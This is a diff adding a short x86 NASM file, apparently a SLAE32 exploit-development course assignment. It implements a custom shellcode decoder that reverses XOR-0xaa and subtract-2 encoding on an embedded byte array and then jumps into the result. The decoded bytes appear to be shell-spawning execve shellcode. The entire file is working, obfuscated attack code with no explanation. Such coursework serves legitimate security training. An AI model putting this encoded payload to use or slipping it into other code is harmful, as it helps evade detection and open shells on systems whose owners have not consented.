@@ -1,0 +1,39 @@
+; decoder.nasm 
+; Author: Ian McLachlan
+; SLAE32 - Assignment 4 Custom Decoder
+
+global _start
+
+section .text
+
+_start:
+	jmp short scode	
+
+setup_stage1:
+
+	pop esi			; esi now contains myshellcode xor version
+	mov edi, esi
+	mov ebx, esi
+
+xordecode:
+						
+	xor byte [esi], 0xaa
+	jz setup_stage2
+	inc esi
+	jnz xordecode
+
+setup_stage2:
+	xor ecx, ecx
+	mov cl, 31
+	mov esi, ebx
+
+add2decode:
+
+	sub byte [edi], 0x2
+	inc edi
+	loop add2decode
+	jmp esi
+
+scode:
+	call setup_stage1
+ 	encodedsc: db 0x99,0x68,0xf8,0xc0,0xce,0xc9,0xdf,0xc0,0xc0,0xce,0xc1,0xda,0x9b,0xc0,0x9b,0x9b,0x9b,0x9b,0x21,0x4f,0xf8,0x21,0x4e,0xff,0x21,0x49,0x18,0xa7,0x65,0x28, 0xaa
